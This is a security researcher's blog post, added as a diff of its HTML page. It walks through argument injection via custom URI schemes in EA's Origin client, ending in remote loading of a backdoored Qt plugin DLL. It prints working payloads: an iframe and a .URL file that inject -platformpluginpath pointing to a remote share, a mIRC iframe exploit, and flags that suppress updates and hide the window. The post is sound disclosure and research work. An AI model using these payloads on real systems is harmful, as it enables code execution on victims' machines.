@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Fun With Custom URI Schemes :: zero.lol</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="0x01 Introduction Over the past month or so, I&amp;rsquo;ve spent quite a bit of time reading and experimenting with custom URI schemes. As the last post on this blog clearly demonstrated, a poorly implemented custom URI can have a number of security concerns. When I say &amp;ldquo;a number&amp;rdquo;, it&amp;rsquo;s because I&amp;rsquo;m about to bring a few more to light, using EA&amp;rsquo;s Origin Client as our crash test dummy.
+TL;DR: Another Origin RCE, unrelated to CVE-2019-11354." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/posts/2019-05-22-fun-with-uri-handlers/" />
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+  <link rel="stylesheet" href="/assets/red.css">
+
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon" href="/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="/img/favicon/red.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="https://zero.lol" />
+  
+    <meta name="twitter:creator" content="Dominik Penner" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Fun With Custom URI Schemes">
+<meta property="og:description" content="0x01 Introduction Over the past month or so, I&amp;rsquo;ve spent quite a bit of time reading and experimenting with custom URI schemes. As the last post on this blog clearly demonstrated, a poorly implemented custom URI can have a number of security concerns. When I say &amp;ldquo;a number&amp;rdquo;, it&amp;rsquo;s because I&amp;rsquo;m about to bring a few more to light, using EA&amp;rsquo;s Origin Client as our crash test dummy.
+TL;DR: Another Origin RCE, unrelated to CVE-2019-11354." />
+<meta property="og:url" content="/posts/2019-05-22-fun-with-uri-handlers/" />
+<meta property="og:site_name" content="zero.lol" />
+
+  
+    <meta property="og:image" content="/img/favicon/red.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2019-05-22 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="red">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    zero.lol
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="https://twitter.com/zer0pwn">Twitter</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="https://twitter.com/zer0pwn">Twitter</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="/posts/2019-05-22-fun-with-uri-handlers/">Fun With Custom URI Schemes</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2019-05-22 
+      </span>
+    
+    
+    <span class="post-author">:: Dominik Penner</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="/tags/uri/">uri</a>&nbsp;
+    
+    #<a href="/tags/rce/">rce</a>&nbsp;
+    
+  </span>
+  
+
+  
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="0x01-introduction">0x01 Introduction<a href="#0x01-introduction" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Over the past month or so, I&rsquo;ve spent quite a bit of time reading and experimenting with custom URI schemes. As the last post on this blog clearly demonstrated, a poorly implemented custom URI can have a number of security concerns. When I say &ldquo;a number&rdquo;, it&rsquo;s because I&rsquo;m about to bring a few more to light, using EA&rsquo;s Origin Client as our crash test dummy.</p>
+<p>TL;DR: Another Origin RCE, unrelated to CVE-2019-11354.</p>
+<h1 id="0x02-custom-uri-schemes">0x02 Custom URI Schemes<a href="#0x02-custom-uri-schemes" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>In this demonstration, we&rsquo;re going to be using the Origin client. However, this vulnerability can be found in a number of other applications. This technique is hardly Origin specific. In order for us to fully understand how this exploit works, we need to understand how Windows treats custom URI schemes.</p>
+<p>If we look for Origin&rsquo;s URI scheme in the registry, this is what we find.</p>
+<p><a href="../../assets/origin_regedit.png"><img src="../../assets/origin_regedit.png" alt="" title="Origin Regedit"></a></p>
+<p>As we can see by this snippet,</p>
+<pre><code>&quot;C:\Program Files (x86)\Origin\Origin.exe&quot; &quot;%1&quot;
+</code></pre><p>whenever we call <code>origin://</code> or <code>origin2://</code>, Windows will use <code>ShellExecute()</code> to spawn the process and replace %1 with our input.</p>
+<p>For example:</p>
+<pre><code>origin://game/launch
+</code></pre><p>Spawns the Origin process with the following command line arguments:</p>
+<pre><code>C:\Program Files (x86)\Origin\Origin.exe &quot;origin://game/launch&quot;
+</code></pre><p>If we RTFM a little bit and check out MSDN&rsquo;s documentation on registering custom URI schemes, we&rsquo;ll see that they point out some security issues. This is what they have to say:</p>
+<p>&ldquo;As noted above, the string that is passed to a pluggable protocol handler might be broken across multiple parameters. Malicious parties could use additional quote or backslash characters to pass additional command line parameters. For this reason, pluggable protocol handlers should assume that any parameters on the command line could come from malicious parties, and carefully validate them. Applications that could initiate dangerous actions based on external data must first confirm those actions with the user. In addition, handling applications should be tested with URIs that are overly long or contain unexpected (or undesirable) character sequences.&rdquo;</p>
+<p>This basically means that the application should be responsible for making sure that there aren&rsquo;t any illegal characters or arguments injected via the crafted URI.</p>
+<h2 id="a-long-history-of-uri-based-exploits">A long history of URI-based exploits<a href="#a-long-history-of-uri-based-exploits" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>As detailed in this blog post&hellip; argument injection via URI isn&rsquo;t new&hellip; at all. <a href="https://medium.com/0xcc/electrons-bug-shellexecute-to-blame-cacb433d0d62">https://medium.com/0xcc/electrons-bug-shellexecute-to-blame-cacb433d0d62</a></p>
+<p>Some of these vulnerabilities can escape the &ldquo;%1&rdquo; argument by adding an unencoded &quot; to the URI. For example, to inject arguments with CVE-2007-3670, all you had to do was get a remote user to visit your specially crafted iframe + URI, and the process would be spawned with the additional arguments injected.</p>
+<pre><code>firefoxurl://placeholder&quot; --argument-injection
+</code></pre><h3 id="couldnt-you-just-use-command-injection">Couldn&rsquo;t you just use command injection?<a href="#couldnt-you-just-use-command-injection" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Because of the way ShellExecute gets called and passes the arguments, you cannot ultimately inject your own commands, only arguments.</p>
+<h1 id="0x03-argument-injection">0x03 Argument Injection<a href="#0x03-argument-injection" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Due to the way that most applications (browsers, mail clients, etc) handle URIs, this becomes difficult to exploit in 2019. Modern browsers (Chrome, Firefox, Edge) will force encode certain characters when a link is handled. This obviously makes escaping the encapsulation difficult.</p>
+<p>However, for custom URIs that don&rsquo;t have encapsulated arguments in the registry, you can easily just inject arguments with a space.</p>
+<p>mIRC was recently vulnerable to this, to achieve RCE, the payload ending up being as simple as:</p>
+<pre><code>&lt;iframe src='irc://? -i\\127.0.0.1\C$\mirc-poc\mirc.ini'&gt;
+</code></pre><p>You can read more about how that exploit was discovered and exploited here:
+<a href="https://proofofcalc.com/cve-2019-6453-mIRC/">https://proofofcalc.com/cve-2019-6453-mIRC/</a></p>
+<p>Anyways, for this example with Origin, we&rsquo;re just going to spin up a fresh Windows 8 box and use IE11. We&rsquo;ll talk more about bypassing modern security mechanisms later.</p>
+<h2 id="the-payload">The Payload<a href="#the-payload" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>So now that we&rsquo;ve spun up our virtual machine, make sure you have Origin installed. Open a notepad, and paste the following:</p>
+<pre><code>&lt;iframe src='origin://?&quot; -reverse &quot;'&gt;
+</code></pre><p>Open it in Internet Explorer, and allow Origin to launch (if it even prompts, lol). You should see the following.</p>
+<p><a href="../../assets/origin_reverse.png"><img src="../../assets/origin_reverse.png" alt="" title="Origin Arginj"></a></p>
+<p>As you can see in the image above, the window icons are now loading in reverse. I failed to mention this, however &ldquo;-reverse&rdquo; is a Qt specific argument. Origin is written mainly using the Qt framework, which is what enticed me into trying these arguments.</p>
+<p>If we take a look at the process using Process Explorer, we see the following:</p>
+<p><a href="../../assets/origin_reverse_poc.png"><img src="../../assets/origin_reverse_poc.png" alt="" title="Origin Arginj"></a></p>
+<p>This clearly demonstrates the argument injection.</p>
+<h1 id="0x04-arbitrary-code-execution">0x04 Arbitrary Code Execution<a href="#0x04-arbitrary-code-execution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Now how on earth are we supposed to get code execution from this? For us to see what options we have available, we need to know what other arguments we can use. We&rsquo;ll stick to the Qt specific arguments before poking around Origin&rsquo;s own arguments.</p>
+<p>After consulting the Qt documentation <a href="https://doc.qt.io/qt-5/qguiapplication.html">https://doc.qt.io/qt-5/qguiapplication.html</a>, we find out that we can use the following arguments on ANY Qt program.</p>
+<pre><code>-platform
+-platformpluginpath
+-platformtheme
+-plugin
+-qmljsdebugger
+-qwindowgeometry
+-qwindowicon
+-qwindowtitle
+-reverse
+-session
+-display
+-geometry
+</code></pre><p>One of the more promising ones was &ldquo;platformpluginpath&rdquo;. This flag allows you to specify a path to load Qt plugins from. These Qt plugins (DLLs) are then loaded into Origin and executed.</p>
+<p>We can exploit this behavior and load plugins remotely if we supply the platformpluginpath argument with a Windows share.</p>
+<p>Qt gives us a table of Qt plugins along with their respective directories. The QGuiApplication will automatically load valid DLLs that are a child of any of the following directories, when given the platformpluginpath argument.</p>
+<table>
+<thead>
+<tr>
+<th>Base Class</th>
+<th>Directory</th>
+<th>Qt Module</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>QAccessibleBridgePlugin</td>
+<td>accessiblebridge</td>
+<td>Qt GUI</td>
+</tr>
+<tr>
+<td>QImageIOPlugin</td>
+<td>imageformats</td>
+<td>Qt GUI</td>
+</tr>
+<tr>
+<td>QPictureFormatPlugin</td>
+<td>pictureformats</td>
+<td>Qt GUI</td>
+</tr>
+<tr>
+<td>QAudioSystemPlugin</td>
+<td>audio</td>
+<td>Qt Multimedia</td>
+</tr>
+<tr>
+<td>QDeclarativeVideoBackendFactoryInterface</td>
+<td>video/declarativevideobackend</td>
+<td>Qt Multimedia</td>
+</tr>
+<tr>
+<td>QGstBufferPoolPlugin</td>
+<td>video/bufferpool</td>
+<td>Qt Multimedia</td>
+</tr>
+<tr>
+<td>QMediaPlaylistIOPlugin</td>
+<td>playlistformats</td>
+<td>Qt Multimedia</td>
+</tr>
+<tr>
+<td>QMediaResourcePolicyPlugin</td>
+<td>resourcepolicy</td>
+<td>Qt Multimedia</td>
+</tr>
+<tr>
+<td>QMediaServiceProviderPlugin</td>
+<td>mediaservice</td>
+<td>Qt Multimedia</td>
+</tr>
+<tr>
+<td>QSGVideoNodeFactoryPlugin</td>
+<td>video/videonode</td>
+<td>Qt Multimedia</td>
+</tr>
+<tr>
+<td>QBearerEnginePlugin</td>
+<td>bearer</td>
+<td>Qt Network</td>
+</tr>
+<tr>
+<td>QPlatformInputContextPlugin</td>
+<td>platforminputcontexts</td>
+<td>Qt Platform Abstraction</td>
+</tr>
+<tr>
+<td>QPlatformIntegrationPlugin</td>
+<td>platforms</td>
+<td>Qt Platform Abstraction</td>
+</tr>
+<tr>
+<td>QPlatformThemePlugin</td>
+<td>platformthemes</td>
+<td>Qt Platform Abstraction</td>
+</tr>
+<tr>
+<td>QGeoPositionInfoSourceFactory</td>
+<td>position</td>
+<td>Qt Positioning</td>
+</tr>
+<tr>
+<td>QPlatformPrinterSupportPlugin</td>
+<td>printsupport</td>
+<td>Qt Print Support</td>
+</tr>
+<tr>
+<td>QSGContextPlugin</td>
+<td>scenegraph</td>
+<td>Qt Quick</td>
+</tr>
+<tr>
+<td>QScriptExtensionPlugin</td>
+<td>script</td>
+<td>Qt Script</td>
+</tr>
+<tr>
+<td>QSensorGesturePluginInterface</td>
+<td>sensorgestures</td>
+<td>Qt Sensors</td>
+</tr>
+<tr>
+<td>QSensorPluginInterface</td>
+<td>sensors</td>
+<td>Qt Sensors</td>
+</tr>
+<tr>
+<td>QSqlDriverPlugin</td>
+<td>sqldrivers</td>
+<td>Qt SQL</td>
+</tr>
+<tr>
+<td>QIconEnginePlugin</td>
+<td>iconengines</td>
+<td>Qt SVG</td>
+</tr>
+<tr>
+<td>QAccessiblePlugin</td>
+<td>accessible</td>
+<td>Qt Widgets</td>
+</tr>
+<tr>
+<td>QStylePlugin</td>
+<td>styles</td>
+<td>Qt Widgets</td>
+</tr>
+</tbody>
+</table>
+<p>Because Origin uses the QtWebEngine and works with image files (jpg, gif, bmp, etc), it requires a few Qt plugins. If we take a look in Origin&rsquo;s install path, we&rsquo;ll see an &ldquo;imageformats&rdquo; directory, which is populated by a number of DLLs.</p>
+<p><a href="../../assets/imageformats_plugins.png"><img src="../../assets/imageformats_plugins.png" alt="" title="Origin Arginj"></a></p>
+<p>Since we know for sure that Origin works with those following DLLs, we can take one of them and use them as a template for our reverse_tcp.</p>
+<p>Before we move forward however, let&rsquo;s just make sure that we can reach a remote destination via the platformpluginpath flag.</p>
+<p><a href="../../assets/origin_remote_plugin.png"><img src="../../assets/origin_remote_plugin.png" alt="" title="Origin Arginj"></a></p>
+<p>Looks good to me.</p>
+<h2 id="creating-the-backdoored-plugin">Creating the Backdoored Plugin<a href="#creating-the-backdoored-plugin" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>As I mentioned earlier, since we have a few DLLs that we know for sure Origin uses, we can use them as templates for an msfvenom payload. The following image demonstrates the creation of a reverse_tcp by first using a DLL file as a template. Qt is pretty picky about what plugins get loaded into memory, which is why I decided to use a template. However, for future reference, all it requires is a valid <code>.qtmetad</code> section.</p>
+<p><a href="../../assets/create_payload.png"><img src="../../assets/create_payload.png" alt="" title="Origin Arginj"></a></p>
+<p>Now that we&rsquo;ve created our backdoored plugin, all we have to do is host a Windows share where we can remotely download it from.</p>
+<p>This Windows share must have one of the directories from the table within it, otherwise it won&rsquo;t properly load the DLL. Since we&rsquo;re using imageformats&hellip; well, we&rsquo;ll use imageformats.</p>
+<p><a href="../../assets/remote_share.png"><img src="../../assets/remote_share.png" alt="" title="Origin Arginj"></a></p>
+<p>Where imageformats is hosting our backdoored plugin &ldquo;FILE1337.dll&rdquo;</p>
+<h2 id="finalizing-the-payload">Finalizing the Payload<a href="#finalizing-the-payload" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Obviously, this isn&rsquo;t complete yet. We have &ldquo;arguably&rdquo; arbitrary code execution, but not remote yet as we have no way to get a user to actually launch our crafted URI. This is where the iframe comes in.</p>
+<pre><code>&lt;iframe src='origin://?&quot; -platformpluginpath \\NOTDANGEROUS &quot;'&gt;
+</code></pre><p>We can host this iframe wherever we want, our target just needs to open it on an outdated browser. If you try the following on Firefox, the process getting spawned looks like this:</p>
+<p><a href="../../assets/opened_from_firefox.png"><img src="../../assets/opened_from_firefox.png" alt="" title="Origin Arginj"></a></p>
+<p>Clearly this defeats the argument injection, which is what I mentioned earlier. This makes exploiting the Origin vulnerability much more difficult.</p>
+<p>Unless we can find a way to launch the process without encoding the special characters on an updated system&hellip; this exploit may not pose as big a threat.</p>
+<p>Anyways, like before, let&rsquo;s just make sure everything works on Internet Explorer before we get ahead of ourselves.</p>
+<!-- raw HTML omitted -->
+<h1 id="0x05-an-issue-with-url-files">0x05 An Issue With .URL Files<a href="#0x05-an-issue-with-url-files" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Seeing as modern browsers seem to protect against injecting arguments into custom URIs, I decided to look into Windows shortcuts. Interestingly enough, shortcut files do not encode special characters, which is an issue on its own. Would Microsoft consider this an issue? Hard to say. If they do, you saw it here first lol.</p>
+<p>Anyways, a .url file typically looks like this:</p>
+<pre><code>[InternetShortcut]
+URL=https://www.google.com
+</code></pre><p>If you click that file, it will open Google in your default browser. However, if we supply it a custom URI, it will launch using said URI. On top of that&hellip; we can inject arguments, because of the lack of sanitization. This could be used to exploit a number of applications&hellip; not just Origin.</p>
+<p>You can use the following .URL file on a fully updated Windows 10 to inject arguments into the Origin process. Let&rsquo;s check it out.</p>
+<pre><code>[InternetShortcut]
+URL=origin://?&quot; -reverse &quot;
+</code></pre><p><a href="../../assets/origin_win10.png"><img src="../../assets/origin_win10.png" alt="" title="Origin Arginj"></a></p>
+<p>The Origin icon you&rsquo;re seeing in the background is the shortuct itself. Nearly impossible to notice the difference between a legitimate Origin.exe shortcut.</p>
+<p>Clearly this attack vector would require some social engineering. .URL files aren&rsquo;t considered dangerous by most browsers. For example, Edge will ask you if you want to open the file, it&rsquo;ll smart-scan it, pass the scan, and launch the process with the injected arguments.</p>
+<p>If you were to convince someone to open a specially crafted .url file, you could leverage code execution and infect someone via the custom URI scheme Origin has implemented.</p>
+<h1 id="0x06-tying-it-all-togther">0x06 Tying It All Togther<a href="#0x06-tying-it-all-togther" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>We&rsquo;ve gotten this far, you may have a couple questions. One of them may be, what if the Origin process is already running? How will the arguments get injected then?</p>
+<p>That&rsquo;s where some of Origin&rsquo;s built-in command-line options will come in handy. There are a number of arguments that Origin accepts that we can use maliciously. So, let&rsquo;s say Origin&rsquo;s already running. In our payload, simply add the following argument:</p>
+<pre><code>origin://?&quot; -Origin_MultipleInstances &quot;
+</code></pre><p>If there&rsquo;s another Origin process running, it&rsquo;ll spawn a brand new one with the arguments we supplied.</p>
+<p>Now, let&rsquo;s also assume that someone installed Origin months ago and haven&rsquo;t touched it in the same amount of time. Whenever Origin starts, it automatically checks for updates before doing anything else. Which means that if Origin were to push out a patch, your client would update before the payload was even executed.</p>
+<p>If we feed Origin the following argument, we can jump over the entire update check.</p>
+<pre><code>origin://?&quot; /noUpdate &quot;
+</code></pre><p>Another thing we can do&hellip; is let Origin run in the background without bringing any attention to the process. Combine all of that along with the remote plugin preload and you&rsquo;ve got a pretty fun exploit.</p>
+<pre><code>origin://?&quot; /StartClientMinimized /noUpdate -Origin_MultipleInstances &quot;
+</code></pre><h1 id="references">References<a href="#references" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<ul>
+<li><a href="https://medium.com/0xcc/electrons-bug-shellexecute-to-blame-cacb433d0d62">https://medium.com/0xcc/electrons-bug-shellexecute-to-blame-cacb433d0d62</a></li>
+<li><a href="https://www.thezdi.com/blog/2019/4/3/loading-up-a-pair-of-qt-bugs-detailing-cve-2019-1636-and-cve-2019-6739">https://www.thezdi.com/blog/2019/4/3/loading-up-a-pair-of-qt-bugs-detailing-cve-2019-1636-and-cve-2019-6739</a></li>
+<li><a href="https://proofofcalc.com/cve-2019-6453-mIRC">https://proofofcalc.com/cve-2019-6453-mIRC</a></li>
+<li><a href="https://doc.qt.io/qt-5/qguiapplication.html">https://doc.qt.io/qt-5/qguiapplication.html</a></li>
+</ul>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="/posts/2019-07-21-axway-securetransport-xml-injection/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Axway SecureTransport 5.x XML Injection / XXE</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="/posts/2019-05-13-xss-to-rce/">
+                <span class="button__text">A Questionable Journey From XSS to RCE</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
